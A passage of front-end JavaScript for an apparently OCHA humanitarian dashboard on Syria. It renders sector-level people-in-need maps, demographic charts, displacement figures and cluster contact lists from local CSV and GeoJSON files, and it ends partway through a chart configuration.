var keyNeedsColumn,
    keyNeedsPie,
    keyDisplacementPie,
    keyDisplacementLine,
    keyAccessDonut,
    keyAccessLine,
    keyPerceptionsDonut,
    keyPerceptionsDonutSatis,
    activeSectorName,
    activeSectorTitle,
    currentSectorName,
    currentSectorTitle,
    activeYear,
    activeSectorData = [],
    activeYearData = [],
    activeYearColumnCategories = [],
    hno_2016_data = [],
    hno_2016_classes = [{
        from: 0,
        to: 9000,
        color: "#e1e9fc"
    }, {
        from: 9001,
        to: 20000,
        color: "#c7d6ee"
    }, {
        from: 20001,
        to: 50000,
        color: "#95b5df"
    }, {
        from: 50001,
        to: 100000,
        color: "#659ad2"
    }, {
        from: 100001,
        to: 300000,
        color: "#0f6cb6"
    }, {
        from: 300001,
        color: "#00346a"
    }],
    hno_2017_data = [],
    hno_2017_classes = [{
        from: 0,
        to: 34200,
        color: "#e1e9fc"
    }, {
        from: 34201,
        to: 90000,
        color: "#c7d6ee"
    }, {
        from: 90001,
        to: 200000,
        color: "#95b5df"
    }, {
        from: 200001,
        to: 340000,
        color: "#659ad2"
    }, {
        from: 340001,
        to: 750000,
        color: "#0f6cb6"
    }, {
        from: 750001,
        color: "#00346a"
    }],
    pmr_2017_data = [],
    pmr_2017_classes = [{
        from: 0,
        to: 16000,
        color: "#e1e9fc"
    }, {
        from: 16001,
        to: 50000,
        color: "#c7d6ee"
    }, {
        from: 50001,
        to: 100000,
        color: "#95b5df"
    }, {
        from: 100001,
        to: 225000,
        color: "#659ad2"
    }, {
        from: 225001,
        to: 360000,
        color: "#0f6cb6"
    }, {
        from: 360001,
        color: "#00346a"
    }],
    hno_2018_data = [],
    hno_2018_classes = pmr_2017_classes,
	pmr_2018_data = [],
	pmr_2018_classes = pmr_2017_classes,
	hno_2019_data = [],
	hno_2019_classes = pmr_2017_classes,
    needs_column_categories_2017 = ['Children in need<br>(0-17 yrs)', 'Youth in need<br>(15-24 yrs)', 'Adults in need<br>(25-59 yrs)', 'Elderly in need<br>(>59 yrs)'],
    needs_column_categories_2018 = ['Children in need<br>(0-4 yrs)', 'Children in need<br>(5-17 yrs)', 'Adults in need<br>(18-59 yrs)', 'Elderly in need<br>(>59 yrs)'],
    needs_column_categories_nutrition_2016 = ['Boys', 'Girls', 'Pregnant and Lactating<br>Women (PLW)'],
    needs_column_categories_nutrition_2017 = ['Boys<br>(6-59 months)', 'Girls<br>(6-59 months)', 'Pregnant and Lactating<br>Women (PLW)'],
    needs_column_categories_nutrition_2018 = ['Children<br>(6-59 months)', 'Pregnant and Lactating<br>Women (PLW)'],
    needs_column_categories_education_2016 = ['Boys', 'Girls', 'Education<br>Actors'],
    needs_column_categories_education_2017 = ['School-age children<br>(5-17 yrs)', 'Education<br>personnel'],
    needs_column_categories_education_2018 = ['Children in need<br>(5-17 yrs)', 'Teachers and<br>education personnel'],
    activeNutritionCategories,
    activeEducationCategories,
    contacts_id = ['protection', 'cccm', 'erl', 'education', 'fs', 'health', 'nutrition', 'shelternfi', 'wash', 'etc', 'logistics', 'ocha'],
    needs_id = ['protection', 'cccm', 'erl', 'education', 'fs', 'health', 'nutrition', 'shelter', 'nfi', 'wash'],
    sector_needs_arr = [
        ["protection", "Protection", "Protection", "Protecti_1"],
        ["cccm", "Camp Coordination and Camp Management", "CCCM_PiN_2", "CCCM_Sever"],
        ["erl", "Early Recovery and Livelihoods", "ERL_PiN_20", "ERL_Severi"],
        ["fs", "Food Security and Agriculture", "FSL_PiN_20", "FSL_Severi"],
        ["health", "Health", "Health_PiN", "Health_Sev"],
        ["shelter", "Shelter", "Shelter_Pi", "Shelter_Se"],
        ["nfi", "Non-Food Items", "NFI_PiN_20", "NFI_Severi"]
    ],
    sector_needs_obj = {
        protection: {
            name: 'protection',
            pin: 'Protection',
            severity: 'Protecti_1'
        },
        cccm: {
            name: 'cccm',
            pin: 'CCCM_PiN_2',
            severity: 'CCCM_Sever'
        },
        erl: {
            name: 'erl',
            pin: 'ERL_PiN_20',
            severity: 'ERL_Severi'
        },
        education: {
            name: 'education',
            pin: 'Education_',
            severity: 'Education1'
        },
        fs: {
            name: 'fs',
            pin: 'FSL_PiN_20',
            severity: 'FSL_Severi'
        },
        health: {
            name: 'health',
            pin: 'Health_PiN',
            severity: 'Health_Sev'
        },
        nutrition: {
            name: 'nutrition',
            pin: 'Nutrition_',
            severity: 'Nutrition1'
        },
        shelter: {
            name: 'shelter',
            pin: 'Shelter_Pi',
            severity: 'Shelter_Se'
        },
        nfi: {
            name: 'nfi',
            pin: 'NFI_PiN_20',
            severity: 'NFI_Severi'
        },
        wash: {
            name: 'wash',
            pin: 'WASH_PiN_2',
            severity: 'WASH_Sever'
        }
    },
    needsPie,
    pieData,
    needsColumn,
    columnData,
    needsMap,
    needs_protection = [],
    needs_cccm = [],
    needs_erl = [],
    needs_education = [],
    needs_fs = [],
    needs_health = [],
    needs_nutrition = [],
    needs_shelter = [],
    needs_nfi = [],
    needs_wash = [],
    contacts_protection = [],
    contacts_cccm = [],
    contacts_erl = [],
    contacts_education = [],
    contacts_fs = [],
    contacts_health = [],
    contacts_nutrition = [],
    contacts_shelternfi = [],
    contacts_wash = [],
    contacts_etc = [],
    contacts_logistics = [],
    contacts_ocha = [],
    contacts_ocha_deputy = [],
    contacts_ocha_officer = [],
    browserVersion = checkIE(),
    base = $.getJSON("./data/sector-needs/geojson/base.json", function(json) {
        base = json;
    }),
    golan = $.getJSON("./data/sector-needs/geojson/golan.json", function(json) {
        golan = json;
    }),
    undof = $.getJSON("./data/sector-needs/geojson/undof.json", function(json) {
        undof = json;
    });

function checkIE() {
    var sAgent = window.navigator.userAgent;
    var Idx = sAgent.indexOf("MSIE");
    if (Idx > 0)
        return parseInt(sAgent.substring(Idx + 5, sAgent.indexOf(".", Idx)));
    else if (!!navigator.userAgent.match(/Trident\/7\./))
        return 11;
    else
        return 0;
}

function generateSectorNeedsEvents() {
    sector_needs_arr.forEach(function(item) {
        $('#needs-' + item[0]).on('touchstart click', function(e) {
            e.stopPropagation();
            e.preventDefault();
            prepareNeedsSector(item[0], item[1], this.id, item[2], item[3]);
            $.fn.fullpage.reBuild();
            needsMap.reflow();
            needsPie.reflow();
            needsColumn.reflow();
        });
    });
}

function prepareNeedsSector(sectorName, sectorTitle, id, sectorSeverity, sectorPin) {
    activeSectorName = sectorName;
    activeSectorTitle = sectorTitle;
    activeSectorData = activeYearData.filter(function(obj) {
        return obj.sector == activeSectorName;
    })[0];
    activateNeedsSector(id);
    updateNeedsMap(window['needs_' + activeSectorName], sectorSeverity, sectorPin);
    showAllSectorNeeds();
    pieData = needsPieData(activeSectorData);
    updateNeedsPie(pieData);
    if (activeYear == 'hno_2016') {
        $("#needs-column-col").hide();
    } else {
        columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
        updateNeedsColumn(columnData, activeYearColumnCategories);
    }
    updateNeedsInputs(activeSectorData, activeSectorTitle);
    setCurrentSector(activeSectorName, activeSectorTitle);
}

function setCurrentSector(sectorName, sectorTitle) {
    currentSectorName = sectorName;
    currentSectorTitle = sectorTitle;
}

function getCurrentSector() {
    activeSectorName = currentSectorName;
    activeSectorTitle = currentSectorTitle;
    activeSectorData = activeYearData.filter(function(obj) {
        return obj.sector == activeSectorName;
    })[0];
    activateNeedsSector('needs-' + activeSectorName);
}

function showAllSectorNeeds() {
    $("#needs-female-col").show();
    $("#needs-male-col").show();
    $("#needs-pie-col").show();
    $("#needs-column-col").show();
    $('#needs-female-col').addClass('d-flex');
    $('#needs-male-col').addClass('d-flex');
    $('#needs-female-col').removeClass('d-none');
    $('#needs-male-col').removeClass('d-none');
    $('#sector-needs-append').removeClass('justify-content-start justify-content-lg-start');
    $("#acute-message").remove();
}

function hideRowPinSectorNeeds() {
    $('#needs-female-col').removeClass('d-flex');
    $('#needs-male-col').removeClass('d-flex');
    $('#needs-female-col').addClass('d-none');
    $('#needs-male-col').addClass('d-none');
    $('#sector-needs-append').addClass('justify-content-lg-start');
}
/* contacts start */
function generateContactsEvents() {
    contacts_id.forEach(function(item) {
        $('#contacts-' + item).on('touchstart click', function(e) {
            e.preventDefault();
            var id = this.id;
            var contact_sector = "contacts_" + id.substring(id.indexOf('-') + 1);
            activateContactsSector(id);
            appendContacts(window[contact_sector]);
        });
    });
}

function activateContactsSector(activatedSector) {
    $("#contacts-sectors>img").removeClass("activate-sector activate-sector-hover");
    $("#" + activatedSector).addClass('activate-sector');

    if (browserVersion > 0) {
        contacts_id.forEach(function(i) {
            var imgSrc = $("#contacts-" + i).attr('src');
            imgSrc = imgSrc.replace(i + '.png', i + '_g.png');
            $("#contacts-" + i).attr("src", imgSrc);
            var activeImgSrc = $("#" + activatedSector).attr('src');
            activeImgSrc = activeImgSrc.replace(i + '_g.png', i + '.png');
            $("#" + activatedSector).attr("src", activeImgSrc);
        });
    }
}

function appendContacts(contactsSectorPapaObj) {
    $("#contacts-append").empty();
    if (contactsSectorPapaObj.length > 0) {
        $("#contacts-sector-name").text(contactsSectorPapaObj[0].sector_name);
        $("#contacts-sector-name").addClass('ocha-dark-blue-text');
        $("#contacts-sector-name").removeClass('red-text');
        for (var i = 0; i < contactsSectorPapaObj.length; i++) {
            $("#contacts-append").append("<div class='w-md-23 py-2 px-4 m-2'>" + "<p class='contacts-sector-text p-0 m-0'><b>" + contactsSectorPapaObj[i].title + ":</b></p>" + "<p class='p-0 m-0'>" + contactsSectorPapaObj[i].name + "</p>" + "<a class='contact-email text-lowercase' href='mailto:" + contactsSectorPapaObj[i].email + "'>" + contactsSectorPapaObj[i].email + "</a>" + '</div>');
        }
        if (contactsSectorPapaObj[0].sector == 'ocha') {
            if (contacts_ocha_deputy.length > 0 && $("#contacts-ocha-deputy").length === 0) {
                $("#contacts-append-ochas").append('<div class="row" id="contacts-ocha-deputy"><div class="col-12"><div class="d-flex flex-wrap fs-9" id="contacts-append-ocha-deputy"></div></div></div>');
                for (var c = 0; c < contacts_ocha_deputy.length; c++) {
                    $("#contacts-append-ocha-deputy").append("<div class='w-md-23 py-2 px-4 m-2'>" + "<p class='contacts-sector-text p-0 m-0'><b>" + contacts_ocha_deputy[c].title + ":</b></p>" + "<p class='p-0 m-0'>" + contacts_ocha_deputy[c].name + "</p>" + "<a class='contact-email text-lowercase' href='mailto:" + contacts_ocha_deputy[c].email + "'>" + contacts_ocha_deputy[c].email + "</a>" + '</div>');
                }
            }
            if (contacts_ocha_officer.length > 0 && $("#contacts-ocha-officer").length === 0) {
                $("#contacts-append-ochas").append('<div class="row" id="contacts-ocha-officer"><div class="col-12"><div class="d-flex flex-wrap fs-9" id="contacts-append-ocha-officer"></div></div></div>');
                for (var j = 0; j < contacts_ocha_officer.length; j++) {
                    $("#contacts-append-ocha-officer").append("<div class='w-md-23 py-2 px-4 m-2'>" + "<p class='contacts-sector-text p-0 m-0'><b>" + contacts_ocha_officer[j].title + ":</b></p>" + "<p class='p-0 m-0'>" + contacts_ocha_officer[j].name + "</p>" + "<a class='contact-email text-lowercase' href='mailto:" + contacts_ocha_officer[j].email + "'>" + contacts_ocha_officer[j].email + "</a>" + '</div>');
                }
            }
        } else {
            $("#contacts-ocha-deputy").remove();
            $("#contacts-ocha-officer").remove();
        }
    } else {
        $("#contacts-append").empty();
        $("#contacts-sector-name").text("ERROR! Sector column doesn't exist in the file");
        $("#contacts-sector-name").removeClass('ocha-dark-blue-text');
        $("#contacts-sector-name").addClass('red-text');
    }
    $.fn.fullpage.reBuild();
}
/* contacts end */
/* sector needs start */
function loadYearsData() {
    Papa.parse("./data/sector-needs/data/en/data.csv", {
        download: true,
        header: true,
        skipEmptyLines: true,
        dynamicTyping: true,
        complete: function(result) {
            var rows = result.data;
            for (var i = 0; i < rows.length; i++) {
                var year = rows[i].year;
                switch (year) {
                    case 'hno_2016':
                        hno_2016_data.push(rows[i]);
                        break;
                    case 'hno_2017':
                        hno_2017_data.push(rows[i]);
                        break;
                    case 'pmr_2017':
                        pmr_2017_data.push(rows[i]);
                        break;
                    case 'hno_2018':
                        hno_2018_data.push(rows[i]);
                        break;
					case 'pmr_2018':
                        pmr_2018_data.push(rows[i]);
                        break;
					case 'hno_2019':
                        hno_2019_data.push(rows[i]);
                        break;
                }
            }
            var years = [hno_2016_data, pmr_2017_data, hno_2017_data, hno_2018_data, pmr_2018_data, hno_2019_data];
            for (var c = 0; c < years.length; c++) {
                if (1 > years[c].length) {
                    $("#sector-needs-append").empty();
                    $("#sector-needs-timeline").empty();
                    $("#pin-asterisk").empty();
                    $("#needs-sector-name").text("ERROR! a year data is missing");
                    $("#needs-sector-name").removeClass('ocha-dark-blue-text');
                    $("#needs-sector-name").addClass('red-text');
                    $.fn.fullpage.reBuild();
                    return false;
                }
            }
            activeYear = 'hno_2019';
            activeYearData = hno_2019_data;
            activeYearColumnCategories = needs_column_categories_2018;
            activeSectorName = "protection";
            activeSectorTitle = "Protection";
            activeSectorData = activeYearData.filter(function(obj) {
                return obj.sector == activeSectorName;
            })[0];
            activateNeedsSector('needs-protection');
            initiateNeedsMap(activeYear, hno_2018_classes, window['needs_protection'], 'Protection', 'Protecti_1');
            pieData = needsPieData(activeSectorData);
            initiateNeedsPie(pieData);
            columnData = needsColumnData(activeSectorData, activeYearColumnCategories);
            initiateNeedsColumn(columnData, activeYearColumnCategories);
            updateNeedsInputs(activeSectorData, activeSectorTitle);
            setCurrentSector(activeSectorName, activeSectorTitle);
        },
        error: function(err, file) {
            $("#sector-needs-append").empty();
            $("#sector-needs-timeline").empty();
            $("#pin-asterisk").empty();
            $("#needs-sector-name").text("ERROR! Data file can't be loaded");
            $("#needs-sector-name").removeClass('ocha-dark-blue-text');
            $("#needs-sector-name").addClass('red-text');
            $.fn.fullpage.reBuild();
        }
    });
}

function initiateNeedsMap(activeYear, legedClasses, data, pin, severity) {
    $.getJSON("./data/sector-needs/geojson/en/" + activeYear + ".json", function(geojson) {
        $.each(geojson.features, function(i) {
            needs_protection[i] = [];
            needs_protection[i][0] = this.properties.Admin3_Pco;
            needs_protection[i][1] = this.properties.Protection;
            needs_cccm[i] = [];
            needs_cccm[i][0] = this.properties.Admin3_Pco;
            needs_cccm[i][1] = this.properties.CCCM_PiN_2;
            needs_erl[i] = [];
            needs_erl[i][0] = this.properties.Admin3_Pco;
            needs_erl[i][1] = this.properties.ERL_PiN_20;
            needs_education[i] = [];
            needs_education[i][0] = this.properties.Admin3_Pco;
            needs_education[i][1] = this.properties.Education_;
            needs_fs[i] = [];
            needs_fs[i][0] = this.properties.Admin3_Pco;
            needs_fs[i][1] = this.properties.FSL_PiN_20;
            needs_health[i] = [];
            needs_health[i][0] = this.properties.Admin3_Pco;
            needs_health[i][1] = this.properties.Health_PiN;
            needs_nutrition[i] = [];
            needs_nutrition[i][0] = this.properties.Admin3_Pco;
            needs_nutrition[i][1] = this.properties.Nutrition_;
            needs_shelter[i] = [];
            needs_shelter[i][0] = this.properties.Admin3_Pco;
            needs_shelter[i][1] = this.properties.Shelter_Pi;
            needs_nfi[i] = [];
            needs_nfi[i][0] = this.properties.Admin3_Pco;
            needs_nfi[i][1] = this.properties.NFI_PiN_20;
            needs_wash[i] = [];
            needs_wash[i][0] = this.properties.Admin3_Pco;
            needs_wash[i][1] = this.properties.WASH_PiN_2;
        });
        needsMap = Highcharts.mapChart("sector-map", {
            chart: {
                animation: false,
                plotBackgroundColor: null,
                plotBorderWidth: null,
                plotShadow: false,
                backgroundColor: null,
                style: {
                    fontFamily: "Roboto"
                }
            },
            title: {
                text: null
            },
            mapNavigation: {
                enabled: false,
                enableDoubleClickZoomTo: true
            },
            tooltip: {
                useHTML: true,
                formatter: function() {
                    return tooltipFormatter(this.point.properties.Admin1_EN, this.point.properties.Admin3_EN, Highcharts.numberFormat(this.point.properties[pin], 0, "", ","), this.point.properties[severity], this.point.properties[severity]);
                }
            },
            exporting: {
                enabled: false
            },
            legend: {
                title: {
                    text: "PEOPLE IN NEED *",
                    style: {
                        color: "#00346A",
                        fontSize: "9px",
                        fontWeight: 'normal'
                    }
                },
                align: "right",
                verticalAlign: "bottom",
                floating: true,
                layout: "vertical",
                valueDecimals: 0,
                backgroundColor: null,
                padding: 4,
                itemMarginTop: 0,
                itemMarginBottom: 0,
                symbolRadius: 0,
                symbolHeight: 12,
                symbolWidth: 12,
                itemStyle: {
                    fontSize: "9px",
                    color: "#00346A",
                    fontWeight: 'normal'
                },
            },
            colorAxis: {
                dataClasses: legedClasses
            },
            credits: {
                enabled: false
            },
            series: [{
                mapData: base,
                animation: false,
                dashStyle: 'LongDashDotDot',
                borderColor: '#868e96',
                borderWidth: 0.7
            }, {
                animation: false,
                data: data,
                dashStyle: 'LongDashDotDot',
                borderColor: '#868e96',
                borderWidth: 0.7,
                mapData: geojson,
                joinBy: ["Admin3_Pco", 0],
                keys: ["Admin3_Pco", "value"],
                name: "Subdistrict level",
                states: {
                    hover: {
                        color: "#ffb732",
                        borderWidth: 1.2
                    }
                },
                dataLabels: {
                    enabled: false
                }
            }, {
                name: "Occupied Golan Heights",
                mapData: golan,
                animation: false,
                dashStyle: 'LongDashDotDot',
                borderColor: '#868e96',
                borderWidth: 0.8,
                color: "#ffffff"
            }, {
                name: "UNDOF Administrated Area",
                mapData: undof,
                animation: false,
                borderColor: '#777777',
                borderWidth: 1,
                color: "#777777",
                colorAxis: false,
                events: {
                    legendItemClick: function() {
                        return false;
                    }
                }
            }]
        });
    });
    Highcharts.setOptions({
        lang: {
            thousandsSep: ","
        }
    });
}

function updateNeedsMap(needs_sector, sector_pin, sector_severity) {
    needsMap.mapZoom();
    needsMap.series[1].setData(null);
    needsMap.series[1].setData(needs_sector);
    needsMap.tooltip.options.formatter = function() {
        return tooltipFormatter(this.point.properties.Admin1_EN, this.point.properties.Admin3_EN, Highcharts.numberFormat(this.point.properties[sector_pin], 0, "", ","), this.point.properties[sector_severity], this.point.properties[sector_severity]);
    };
}

function needsPieData(activeSectorData) {
    if (!activeSectorData.pie_1) {
        activeSectorData.pie_1 = null;
    }
    if (!activeSectorData.pie_2) {
        activeSectorData.pie_2 = null;
    }
    var data = [{
        name: 'Female',
        y: activeSectorData.pie_1
    }, {
        name: 'Male',
        y: activeSectorData.pie_2
    }];
    if (!activeSectorData.pie_1 && !activeSectorData.pie_2) {
        data = null;
    }
    return data;
}

function initiateNeedsPie(pieData) {
    needsPie = Highcharts.chart('needs-pie', {
        chart: {
            plotBackgroundColor: null,
            plotBorderWidth: null,
            plotShadow: false,
            backgroundColor: null,
            style: {
                fontFamily: "Roboto"
            },
            type: 'pie'
        },
        title: {
            text: null
        },
        credits: {
            enabled: false
        },
        exporting: {
            enabled: false
        },
        tooltip: {
            headerFormat: null,
            pointFormat: '<span style="color:#026CB6">{point.name}:</span><br>{point.y}%'
        },
        plotOptions: {
            pie: {
                borderWidth: 4,
                borderColor: '#e6e6e6',
                allowPointSelect: true,
                colors: ['#6ecff6', '#026CB6'],
                dataLabels: {
                    enabled: true,
                    format: '{point.name}<br>{point.y}%',
                    distance: -35,
                    style: {
                        textOutline: false,
                        fontWeight: 'normal',
                        fontSize: '10px'
                    }
                }
            }
        },
        series: [{
            name: 'PiN',
            data: pieData,
            shadow: true
        }]
    });
}

function updateNeedsPie(pieData) {
    needsPie.series[0].setData(null);
    needsPie.series[0].setData(pieData);
}

function needsColumnData(activeSectorData, xAxisCategories) {
    var data = [],
        dataArray = [activeSectorData.col_1, activeSectorData.col_2, activeSectorData.col_3, activeSectorData.col_4];
    for (var i = 0; i < xAxisCategories.length; i++) {
        var item = {
            name: xAxisCategories[i].replace(/<br>/g, " "),
            y: dataArray[i]
        };
        data.push(item);
    }
    return data;
}

function initiateNeedsColumn(columnData, xAxisCategories) {
    needsColumn = Highcharts.chart('needs-column', {
        chart: {
            type: 'column',
            backgroundColor: null,
            style: {
                fontFamily: "Roboto"
            }
        },
        title: {
            text: null
        },
        credits: {
            enabled: false
        },
        exporting: {
            enabled: false
        },
        xAxis: {
            categories: xAxisCategories,
            lineColor: '#bdbdbd',
            tickColor: '#bdbdbd',
            labels: {
                style: {
                    color: '#3f3f3f'
                }
            }
        },
        yAxis: {
            title: {
                text: null
            },
            labels: {
                enabled: false
            },
            gridLineWidth: 0,
            minorGridLineWidth: 0
        },
        legend: {
            enabled: false
        },
        plotOptions: {
            series: {
                borderWidth: 0,
                shadow: true,
                dataLabels: {
                    enabled: true,
                    align: 'center',
                    format: '{point.y:,.2f} M',
                    style: {
                        textOutline: false,
                        fontWeight: 'normal',
                        fontSize: '10px'
                    }
                }
            }
        },
        tooltip: {
            headerFormat: null,
            pointFormat: '<span style="color:#026CB6">{point.name}:</span><br>{point.y:,.2f} Million'
        },
        series: [{
            name: 'Brands',
            color: '#6ecff6',
            data: columnData
        }]
    });
}

function updateNeedsColumn(columnData, xAxisCategories) {
    needsColumn.xAxis[0].setCategories(null);
    needsColumn.xAxis[0].setCategories(xAxisCategories);
    needsColumn.series[0].setData(null);
    needsColumn.series[0].setData(columnData);
}

function updateNeedsInputs(activeSectorData, activeSectorTitle) {
    $("#needs-sector-name").text(activeSectorTitle);
    $("#needs-people").text(activeSectorData.pin);
    $("#needs-female").text(activeSectorData.f_pin);
    $("#needs-male").text(activeSectorData.m_pin);
    $("#needs-message").text(activeSectorData.key_message);
}

function activateNeedsSector(activatedSector) {
    $("#needs-sectors>img").removeClass("activate-sector activate-sector-hover");
    $("#" + activatedSector).addClass('activate-sector');

    if (browserVersion > 0) {
        needs_id.forEach(function(i) {
            var imgSrc = $("#needs-" + i).attr('src');
            imgSrc = imgSrc.replace(i + '.png', i + '_g.png');
            $("#needs-" + i).attr("src", imgSrc);
            var activeImgSrc = $("#" + activatedSector).attr('src');
            activeImgSrc = activeImgSrc.replace(i + '_g.png', i + '.png');
            $("#" + activatedSector).attr("src", activeImgSrc);
        });
    }
}

function tooltipFormatter(adm1En, subDistict, pIn, sevImg, sev) {
    var tooltip_html;
    tooltip_html = "<table id='highcharts-tooltip'>";
    tooltip_html += "<tr><td><b>Governorate:</b> " + adm1En + "</td></tr>";
    tooltip_html += "<tr><td><b>Sub-district:</b> " + subDistict + "</td></tr>";
    tooltip_html += "<tr><td><hr id='tooltip-hr'></td></tr>";
    tooltip_html += "<tr><td><b>PiN:</b> " + pIn + "</td></tr>";
    tooltip_html += "<tr><td><hr id='tooltip-hr'></td></tr>";
    switch (sevImg * 1) {
        case 0:
            tooltip_html += "<tr><td><b>Severity ranking:</b> " + 0 + "</td></tr>";
            break;
        case 1:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/1.png" + " class='pt-1'></td></tr>";
            break;
        case 2:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/2.png" + " class='pt-1'></td></tr>";
            break;
        case 3:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/3.png" + " class='pt-1'></td></tr>";
            break;
        case 4:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/4.png" + " class='pt-1'></td></tr>";
            break;
        case 5:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/5.png" + " class='pt-1'></td></tr>";
            break;
        case 6:
            tooltip_html += "<tr><td><b>Severity ranking: </b></td></tr>";
            tooltip_html += "<tr><td><img src=" + "./assets/media/img/en/6.png" + " class='pt-1'></td></tr>";
            break;
        default:
            tooltip_html += "<tr><td><b>Severity ranking: </b>" + sev + "</td></tr>";
    }
    tooltip_html += "</table>";
    return tooltip_html;
}
/* sector needs end */
/* key figures start */
keyNeedsColumn = Highcharts.chart('key-needs-column', {
    chart: {
        type: 'column',
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        }
    },
    title: {
        text: null
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    xAxis: {
        categories: ['Jun<br>2012', 'Sep', 'Dec', 'Apr<br>2013', 'Sep', 'May<br>2014', 'Dec', 'Sep<br>2015', 'Sep<br>2016', 'Sep<br>2017', 'Dec<br>2018'],
        lineColor: '#bdbdbd',
        tickColor: '#bdbdbd',
        labels: {
            style: {
                color: '#3f3f3f'
            }
        }
    },
    yAxis: {
        title: {
            text: null
        },
        labels: {
            enabled: false
        },
        gridLineWidth: 0,
        minorGridLineWidth: 0
    },
    legend: {
        enabled: false
    },
    plotOptions: {
        series: {
            borderWidth: 0,
            shadow: true,
            dataLabels: {
                enabled: true,
                align: 'center',
                format: '{point.y:,.1f}',
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            }
        }
    },
    tooltip: {
        headerFormat: null,
        pointFormat: '<span style="color:#026CB6">{point.name}:</span><br>{point.y:,.1f}'
    },
    series: [{
        name: 'Brands',
        color: '#6ecff6',
        data: [{
            name: 'Jun 2012',
            y: 1,
        }, {
            name: 'Sep',
            y: 2.5,
        }, {
            name: 'Dec',
            y: 4,
        }, {
            name: 'Apr 2013',
            y: 6.8,
        }, {
            name: 'Sep',
            y: 9.3,
        }, {
            name: 'May 2014',
            y: 10.8,
        }, {
            name: 'Dec',
            y: 12.2,
        }, {
            name: 'Sep 2015',
            y: 13.5,
        }, {
            name: 'Sep 2016',
            y: 13.5,
        }, {
            name: 'Sep 2017',
            y: 13.1,
        }, {
            name: 'Dec 2018',
            y: 11.7,
        }]
    }]
});
keyNeedsPie = Highcharts.chart('key-needs-pie', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'pie'
    },
    title: {
        text: null
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    tooltip: {
        headerFormat: null,
        pointFormat: '<span style="color:#026CB6">{point.name}:</span><br>{point.y}%'
    },
    plotOptions: {
        pie: {
            borderWidth: 4,
            borderColor: '#f5f5f5',
            allowPointSelect: true,
            colors: ['#6ecff6', '#026CB6'],
            dataLabels: {
                enabled: true,
                format: '{point.name}<br>{point.y}%',
                distance: -35,
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            }
        }
    },
    series: [{
        name: 'PiN',
        data: [{
            name: 'Female',
            y: 50.5
        }, {
            name: 'Male',
            y: 49.5
        }],
        shadow: true
    }]
});
keyDisplacementPie = Highcharts.chart('key-displacement-pie', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'pie'
    },
    title: {
        text: null
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    tooltip: {
        headerFormat: null,
        pointFormat: '<span style="color:#026CB6">{point.name}:</span><br>{point.y}%'
    },
    plotOptions: {
        pie: {
            borderWidth: 4,
            borderColor: '#f5f5f5',
            allowPointSelect: true,
            colors: ['#6ecff6', '#026CB6'],
            dataLabels: {
                enabled: true,
                format: '{point.name}<br>{point.y}%',
                distance: -35,
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            }
        }
    },
    series: [{
        name: 'PiN',
        data: [{
            name: 'Female',
            y: 50
        }, {
            name: 'Male',
            y: 50
        }],
        shadow: true,
    }]
});
keyDisplacementLine = Highcharts.chart('key-displacement-line', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'line'
    },
    title: {
        text: null
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    xAxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
        lineColor: '#e6e6e6',
        tickColor: '#e6e6e6',
        labels: {
            style: {
                color: '#000000'
            }
        }
    },
    yAxis: {
        title: {
            text: null
        },
        labels: {
            enabled: false
        },
        gridLineWidth: 0,
        minorGridLineWidth: 0
    },
    legend: {
        enabled: false
    },
    tooltip: {
        useHTML: true,
        headerFormat: null,
        formatter: function() {
            return '<span style="color:#026CB6">' + this.x + ':</span><br><b>' + Highcharts.numberFormat(this.y, 0, ",", ".") + '</b>';
        }
    },
    plotOptions: {
        line: {
            dataLabels: {
                enabled: true,
                style: {
                    textOutline: false,
                    fontWeight: 'normal',
                    fontSize: '10px'
                }
            },
            enableMouseTracking: true
        }
    },
    series: [{
        name: 'IDPs',
        data: [258, 168, 356, 132, 142, 136, 108, 61, 84, 64, 67, 59],
        shadow: true
    }]
});
keyAccessDonut = Highcharts.chart('key-access-donut', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
        style: {
            fontFamily: "Roboto"
        },
        type: 'pie'
    },
    credits: {
        enabled: false
    },
    exporting: {
        enabled: false
    },
    title: {
        text: '27%',
        align: 'center',
        verticalAlign: 'middle',
        y: 8,
        style: {
            fontSize: '20px'
        }
    },
    tooltip: {
        enabled: false
    },
    plotOptions: {
        pie: {
            borderColor: '#f5f5f5',
            colors: ['#6ecff6', '#c7c8ca'],
            dataLabels: {
                enabled: false
            },
            startAngle: 0,
            endAngle: 360,
            center: ['50%', '50%']
        }
    },
    series: [{
        type: 'pie',
        innerSize: '60%',
        data: [
            ['', 27],
            ['', 73], {
                dataLabels: {
                    enabled: false
                }
            }
        ],
        shadow: true
    }]
});
keyAccessLine = Highcharts.chart('key-access-line', {
    chart: {
        plotBackgroundColor: null,
        plotBorderWidth: null,
        plotShadow: false,
        backgroundColor: null,
